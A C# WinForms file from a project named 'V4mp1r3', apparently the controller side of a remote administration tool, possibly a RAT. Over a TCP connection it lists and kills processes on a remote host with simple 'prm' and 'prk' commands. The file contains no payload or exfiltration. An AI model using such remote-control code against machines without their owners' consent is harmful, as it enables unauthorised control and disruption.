using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace V4mp1r3
{
    public partial class frmProccessManage : Form
    {
        public frmProccessManage(TcpClient client)
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.client = client;
        }
        TcpClient client;

        private void frmProccessManage_Load(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(ProcessFlush));
            thread1.Start();
        }
        private void ProcessFlush()
        {
            button1.Enabled = false;
            button2.Enabled = false;
            try
            {
                listView1.Items.Clear();
                this.Text = "加载中......";
                NetworkStream clientStream = client.GetStream();
                BinaryWriter bw = new BinaryWriter(clientStream);
                bw.Write("prm");
                BinaryReader br = new BinaryReader(clientStream);
                string pname = br.ReadString();
                br = new BinaryReader(clientStream);
                string pid = br.ReadString();
                br = new BinaryReader(clientStream);
                string pplace = br.ReadString();
                string[] pnames = pname.Split(',');
                string[] pids = pid.Split(',');
                string[] pplaces = pplace.Split(',');
                for (int i = 0; i < pnames.Length; i++)
                {
                    listView1.Items.Add(new ListViewItem(new string[] { pnames[i], pids[i], pplaces[i] }));
                }
                this.Text = "进程管理 - " + pnames.Length + "个进程";
                button1.Enabled = true;
                button2.Enabled = true;
            }
            catch
            {
                button1.Enabled = true;
                button2.Enabled = true;
                MessageBox.Show("远程已主机断开连接！", "提示");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(listView1.FocusedItem == null)
            {
                MessageBox.Show("请选择进程！", "提示");
            }
            else
            {
                button1.Enabled = false;
                try
                {
                    string pid = listView1.SelectedItems[0].SubItems[1].Text;
                    NetworkStream clientStream = client.GetStream();
                    BinaryWriter bw = new BinaryWriter(clientStream);
                    bw.Write("prk," + pid);
                    button1.Enabled = true;
                }
                catch
                {
                    MessageBox.Show("远程已主机断开连接！", "提示");
                }
                listView1.SelectedItems[0].Remove();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(ProcessFlush));
            thread1.Start();
        }
    }
}
